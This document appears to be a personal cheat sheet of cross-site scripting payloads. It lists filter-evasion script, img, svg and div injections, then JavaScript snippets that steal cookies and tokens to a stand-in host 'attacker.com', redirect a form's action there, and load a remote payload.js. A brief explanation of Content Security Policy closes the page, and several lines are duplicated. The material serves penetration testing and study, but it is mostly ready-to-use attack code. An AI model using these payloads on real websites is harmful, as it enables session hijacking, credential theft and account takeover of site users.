## Payloads - PoCs
[[Payloads]]
[[Payload of all things XSS]]
```
// Basic payload
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061lert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">

// Img payload
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
<><img src=1 onerror=alert(1)>

// Svg payload
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
<svg><script>alert('33')
<svg><script>alert&lpar;'33'&rpar;

// Div payload
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>
```
### JavaSript Functions
#### Visual Feedback (proof-of-concept)
```
alert("XSS")
console.log("XSS")
prompt("XSS")
confirm("XSS")
throw new Error("XSS")
document.title = "XSS"
document.body.innerHTML = "XSS"
document.write("XSS")
location.hash = "#XSS"
window.status = "XSS" (works in some browsers)
history.pushState({}, '', '/XSS')
```
---
#### Data Exfiltration (cookie/session theft, token stealing)
```
fetch("http://attacker.com?c=" + document.cookie)

new Image().src = "http://attacker.com?c=" + document.cookie

navigator.sendBeacon("http://attacker.com", document.cookie)

location.href = "http://attacker.com?c=" + document.cookie

document.location = "http://attacker.com"

window.open("http://attacker.com?data=" + btoa(document.cookie))

$.get("http://attacker.com", {data:document.cookie})` (jQuery-based)
```
#### DOM Manipulation / Exploitation
```
document.getElementById("target").innerHTML = "XSS"

document.querySelector("body").setAttribute("style", "background:red")

document.querySelector("body").setAttribute("style", "background:red")

document.forms[0].submit()

`document.getElementsByTagName("form")[0].action = "http://attacker.com"`
```
#### Execution Triggers (callbacks, persistence)
```
setTimeout("console.log('XSS')", 1000)

setInterval(()=>{console.log("XSS")}, 3000)

window.onload = () => console.log("XSS")

window.addEventListener("load", () => console.log("XSS"))

window.addEventListener("load", () => console.log("XSS"))

document.addEventListener("DOMContentLoaded", () => console.log("XSS"))
```
#### Accessing Sensitive Data (To use in other payloads)
```
document.cookie

localStorage.getItem("token")

sessionStorage.getItem("session")

document.referrer

document.URL

navigator.userAgent

navigator.platform

navigator.language

navigator.clipboard.readText().then(console.log)` *(requires permissions)
```
#### Advanced / Obfuscation / Evasion
```
eval("console.log('XSS')")

Function("console.log('XSS')")()

  (function(){
    var x = document.createElement("script");
    x.src = "http://attacker.com/payload.js";
    document.body.appendChild(x);
  })();

`<svg/onload=(()=>{console.log('XSS')})()>` _(arrow function inline)

`<svg/onload=(()=>{console.log('XSS')})()>` _(arrow function inline)

`<svg/onload=(()=>{console.log('XSS')})()>` _(arrow function inline)
```
File download / system interaction
```
window.open("data:text/html;base64," + btoa("<script>...</script>"))

location.href = "data:text/html,<script>...</script>"
```
---
**A Content Security Policy (CSP)** is a security header that tells the browser which resources (scripts, styles, images, etc.) it’s allowed to load and execute.
- **How it works:** You send an HTTP header (or `<meta>` tag) that declares rules like:
    - Only allow scripts from `self` (your domain) or specific CDNs.
    - Block inline JavaScript unless explicitly allowed (via nonces or hashes).
    - Restrict where images, fonts, frames, or AJAX requests can come from.
- **Example:**
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self';
```
